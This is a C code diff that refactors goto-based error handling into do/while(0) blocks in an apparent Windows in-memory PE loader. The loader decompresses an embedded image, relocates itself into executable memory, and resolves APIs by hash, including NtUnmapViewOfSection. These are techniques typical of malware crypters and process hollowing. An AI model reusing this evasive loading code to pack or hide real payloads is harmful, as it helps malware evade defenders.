@@ -69,7 +69,6 @@ BOOL OniGetLoaderSection(__in PONI_PARAM pOniParam) {
 	HANDLE hMap = NULL;
 	HANDLE hSelfMap = NULL;
 	BOOL bLoaderSectionFound = FALSE;
-	BOOL bRet = FALSE;
 	_PPEB pPeb;
 	int i;
 
@@ -90,22 +89,24 @@ BOOL OniGetLoaderSection(__in PONI_PARAM pOniParam) {
 			break;
 		}
 	}
-
-	if (!bLoaderSectionFound) {
-		goto out;
-	}
+	
+	do {
+		if (!bLoaderSectionFound) {
+			break;
+		}
 
 #ifdef _WIN32
-	pPeb = (_PPEB)__readfsdword(0x30);
+		pPeb = (_PPEB)__readfsdword(0x30);
 #else
-	pPeb = (_PPEB)__readgsdword(0x30);
+		pPeb = (_PPEB)__readgsdword(0x30);
 #endif
 
-	pOniParam->lpLoaderBase = pPeb->lpImageBaseAddress;
-	bRet = TRUE;
-
-out:
-	return bRet;
+		pOniParam->lpLoaderBase = pPeb->lpImageBaseAddress;
+		return TRUE;
+		
+	} while(0);
+	
+	return FALSE;
 }
 
 BOOL OniDecompressInputBuffer(__in PONI_PARAM pOniParam) {
@@ -124,62 +125,62 @@ BOOL OniDecompressInputBuffer(__in PONI_PARAM pOniParam) {
 		NULL,                          
 		&hDecompressor);                 
 
-	if (!bSuccess) {
-		goto done;
-	}
-
-	bSuccess = pOniParam->pDecompress(
-		hDecompressor,                
-		lpCompressedBuffer,           
-		szCompressedBufferSize,        
-		NULL,                          
-		0,                             
-		&_szDecompressedBufferSize);   
-
-	if (!bSuccess) {
-		DWORD ErrorCode = GetLastError();
-
-		if (ErrorCode != ERROR_INSUFFICIENT_BUFFER) {
-			goto done;
+	do {
+		if (!bSuccess) {
+			break;
 		}
 
-		pbDecompressedBuffer = (PBYTE)pOniParam->pLocalAlloc(LPTR, _szDecompressedBufferSize);
-		if (!pbDecompressedBuffer) {
-			goto done;
+		bSuccess = pOniParam->pDecompress(
+			hDecompressor,                
+			lpCompressedBuffer,           
+			szCompressedBufferSize,        
+			NULL,                          
+			0,                             
+			&_szDecompressedBufferSize);   
+
+		if (!bSuccess) {
+			DWORD ErrorCode = GetLastError();
+
+			if (ErrorCode != ERROR_INSUFFICIENT_BUFFER) {
+				break;
+			}
+
+			pbDecompressedBuffer = (PBYTE)pOniParam->pLocalAlloc(LPTR, _szDecompressedBufferSize);
+			if (!pbDecompressedBuffer) {
+				break;
+			}
 		}
-	}
 
-	bSuccess = pOniParam->pDecompress(
-		hDecompressor,               
-		lpCompressedBuffer,           
-		szCompressedBufferSize,       
-		pbDecompressedBuffer,         
-		_szDecompressedBufferSize,    
-		&_szDecompressedDataSize);    
+		bSuccess = pOniParam->pDecompress(
+			hDecompressor,               
+			lpCompressedBuffer,           
+			szCompressedBufferSize,       
+			pbDecompressedBuffer,         
+			_szDecompressedBufferSize,    
+			&_szDecompressedDataSize);    
 
-	if (!bSuccess) {
-		goto done;
-	}
+		if (!bSuccess) {
+			break;
+		}
 
-	pOniParam->lpImageMapping = pbDecompressedBuffer;
-	pOniParam->dwImageSize = _szDecompressedBufferSize;
-	pOniParam->pDosHeader = (PIMAGE_DOS_HEADER)pOniParam->lpImageMapping;
+		pOniParam->lpImageMapping = pbDecompressedBuffer;
+		pOniParam->dwImageSize = _szDecompressedBufferSize;
+		pOniParam->pDosHeader = (PIMAGE_DOS_HEADER)pOniParam->lpImageMapping;
 
-	if (!pOniParam->pDosHeader || 
-		pOniParam->pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
-		goto done;
-	}
+		if (!pOniParam->pDosHeader || 
+			pOniParam->pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
+			break;
+		}
 
-	pOniParam->pNtHeaders = (PIMAGE_NT_HEADERS)(
-		(PBYTE)pOniParam->lpImageMapping + pOniParam->pDosHeader->e_lfanew);
-	if (!pOniParam->pNtHeaders || 
-		pOniParam->pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
-		goto done;
-	}
-	
-	return TRUE;
+		pOniParam->pNtHeaders = (PIMAGE_NT_HEADERS)(
+			(PBYTE)pOniParam->lpImageMapping + pOniParam->pDosHeader->e_lfanew);
+		if (!pOniParam->pNtHeaders || 
+			pOniParam->pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
+			break;
+		}
+		return TRUE;		
+	} while(0);
 
-done:
 	if (hDecompressor != NULL) {
 		pOniParam->pCloseDecompressor(hDecompressor);
 	}
@@ -196,23 +197,27 @@ BOOL OniNeedSelfRelocation(__in PONI_PARAM pOniParam) {
 	PIMAGE_NT_HEADERS pLdrNtHeaders;
 
 	dwLdrBase = (DWORD)pOniParam->pGetModuleHandle(NULL);
-	if (!dwLdrBase) {
-		return FALSE;
-	}
-
-	pLdrDosHeader = (PIMAGE_DOS_HEADER)dwLdrBase;
-	pLdrNtHeaders = (PIMAGE_NT_HEADERS)(
-		(PBYTE)dwLdrBase + pLdrDosHeader->e_lfanew);
 	
-	if (pLdrNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
-		return FALSE;
-	}
+	do {
+		if (!dwLdrBase) {
+			break;
+		}
 
-	if ((pOniParam->pNtHeaders->OptionalHeader.ImageBase >= dwLdrBase)
-		&& (pOniParam->pNtHeaders->OptionalHeader.ImageBase <
-		(dwLdrBase + pLdrNtHeaders->OptionalHeader.SizeOfImage))) {
-		return TRUE;
-	}
+		pLdrDosHeader = (PIMAGE_DOS_HEADER)dwLdrBase;
+		pLdrNtHeaders = (PIMAGE_NT_HEADERS)(
+			(PBYTE)dwLdrBase + pLdrDosHeader->e_lfanew);
+
+		if (pLdrNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
+			break;
+		}
+
+		if ((pOniParam->pNtHeaders->OptionalHeader.ImageBase >= dwLdrBase)
+			&& (pOniParam->pNtHeaders->OptionalHeader.ImageBase <
+			(dwLdrBase + pLdrNtHeaders->OptionalHeader.SizeOfImage))) {
+			return TRUE;
+		}
+	} while(0);
+	
 	return FALSE;
 }
 
@@ -358,44 +363,48 @@ BOOL OniRelocateAndPivot(__in PONI_PARAM pOniParam, __in LPVOID pContFunc, __in 
 	DWORD dwRelDelta;
 	VOID (__stdcall * pFptr)(PONI_PARAM);
 
-	lpLdrBase = (LPVOID) pOniParam->pGetModuleHandle(NULL);
-	if (!lpLdrBase) {
-		return FALSE;
-	}
+	do {
+		lpLdrBase = (LPVOID) pOniParam->pGetModuleHandle(NULL);
+		if (!lpLdrBase) {
+			break;
+		}
 
-	pLdrDosHeader = (PIMAGE_DOS_HEADER)lpLdrBase;
-	pLdrNtHeaders = (PIMAGE_NT_HEADERS)(
-		(PBYTE)lpLdrBase + pLdrDosHeader->e_lfanew);
+		pLdrDosHeader = (PIMAGE_DOS_HEADER)lpLdrBase;
+		pLdrNtHeaders = (PIMAGE_NT_HEADERS)(
+			(PBYTE)lpLdrBase + pLdrDosHeader->e_lfanew);
+
+		lpNewBase = pOniParam->pVirtualAlloc(NULL, pLdrNtHeaders->OptionalHeader.SizeOfImage,
+			MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+		if (!lpNewBase) {
+			break;
+		}
+
+		pOniParam->lpLoaderRelocatedBase = lpNewBase;
+		OniMemCpy(lpNewBase, lpLdrBase,
+			pLdrNtHeaders->OptionalHeader.SizeOfImage);
+
+		if (!OniProcessIAT((DWORD)lpNewBase, pOniParam)) {
+			break;
+		}
+
+		dwRelDelta = (DWORD)((DWORD)lpNewBase - (DWORD)lpLdrBase);
+		if (!OniApplyBaseRelocations((DWORD)lpNewBase, (DWORD)dwRelDelta)) {
+			break;
+		}
+
+		pOniParam->lpLoaderBase = lpNewBase;
+
+		dwRelocatedContFuncAddr = ((DWORD)pContFunc) - (DWORD)lpLdrBase;
+		dwRelocatedContFuncAddr += (DWORD)lpNewBase;
+
+		pFptr = (VOID (__stdcall*)(PONI_PARAM))dwRelocatedContFuncAddr;
+		pFptr(pParam);
+
+		return TRUE;
+	} while(0);
 	
-	lpNewBase = pOniParam->pVirtualAlloc(NULL, pLdrNtHeaders->OptionalHeader.SizeOfImage,
-		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-	
-	if (!lpNewBase) {
-		return FALSE;
-	}
-
-	pOniParam->lpLoaderRelocatedBase = lpNewBase;
-	OniMemCpy(lpNewBase, lpLdrBase,
-		pLdrNtHeaders->OptionalHeader.SizeOfImage);
-
-	if (!OniProcessIAT((DWORD)lpNewBase, pOniParam)) {
-		return FALSE;
-	}
-
-	dwRelDelta = (DWORD)((DWORD)lpNewBase - (DWORD)lpLdrBase);
-	if (!OniApplyBaseRelocations((DWORD)lpNewBase, (DWORD)dwRelDelta)) {
-		return FALSE;
-	}
-
-	pOniParam->lpLoaderBase = lpNewBase;
-
-	dwRelocatedContFuncAddr = ((DWORD)pContFunc) - (DWORD)lpLdrBase;
-	dwRelocatedContFuncAddr += (DWORD)lpNewBase;
-
-	pFptr = (VOID (__stdcall*)(PONI_PARAM))dwRelocatedContFuncAddr;
-	pFptr(pParam);
-
-	return TRUE;
+	return FALSE;
 }	
 
 BOOL OniLoadImage(__in PONI_PARAM pOniParam) {
@@ -500,20 +509,22 @@ BOOL OniRunImage(__in PONI_PARAM pOniParam) {
 }
 
 BOOL OniLoadAndRunImage(__in PONI_PARAM pOniParam) {
-	if (!OniLoadImage(pOniParam)) {
-		goto out;
-	} 
-	if (!OniProcessIAT(pOniParam->dwImageBase, pOniParam)) {
-		goto out;
-	}
-	if (!OniApplyRelocations(pOniParam)) {
-		goto out;
-	}
-	if (!OniRunImage(pOniParam)) {
-		goto out;
-	}
-	return TRUE;
-out:
+	do {
+		if (!OniLoadImage(pOniParam)) {
+			break;
+		} 
+		if (!OniProcessIAT(pOniParam->dwImageBase, pOniParam)) {
+			break;
+		}
+		if (!OniApplyRelocations(pOniParam)) {
+			break;
+		}
+		if (!OniRunImage(pOniParam)) {
+			break;
+		}
+		return TRUE;
+	} while(0);
+
 	return FALSE;
 }
 
@@ -584,7 +595,6 @@ LPVOID OniFindDllBase(__in DWORD dwFNVHash) {
 
 BOOL OniResolveDynamicImports(__in PONI_PARAM pOniParam) {
 	CHAR pcsCabinetDll[] = { 'C', 'A', 'B', 'I', 'N', 'E', 'T', '.', 'D', 'L', 'L', '\0' };
-	BOOL bRet = FALSE;
 
 	do {
 		if (!(pOniParam->pKernel32Base = OniFindDllBase(0xa3e6f6c3))) {
@@ -645,9 +655,10 @@ BOOL OniResolveDynamicImports(__in PONI_PARAM pOniParam) {
 			(NtUnmapViewOfSectionProto)OniFindDllExport(OniFindDllBase(0xa62a3b3b), 0x2620a5cc))) {
 			break;
 		}
-		bRet = TRUE;
+		return TRUE;
 	} while (0);
-	return bRet;
+	
+	return FALSE;
 }
 
 int wmain(int argc, wchar_t* argv[]) {
